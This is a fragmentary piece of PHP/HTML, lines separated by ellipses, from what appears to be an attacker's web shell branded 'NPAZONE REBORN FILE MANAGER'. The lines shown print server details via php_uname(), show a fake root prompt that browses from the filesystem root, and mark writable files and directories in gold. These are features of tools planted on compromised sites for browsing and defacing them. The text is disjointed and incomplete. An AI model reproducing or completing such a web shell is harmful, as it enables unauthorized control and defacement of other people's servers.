...
<H1><center> &lt;/&gt; <font color="white">NPAZONE REBORN</font> <font color="dodgerblue">FILE MANAGER</font></center></h1>
...
<font color="gold"><center>'.php_uname().'</center></font><br>';
...
echo '<font color=#fff><center>$ root@ipkzone : <a href="?path=/">/</a>';
...
if(is_writable("$path/$dir")) echo '<font color="gold">';
...
if(is_writable("$path/$file")) echo '<font color="gold">';
...
echo '<br><center>{ NPAZONE REBORN ! }</b></body>
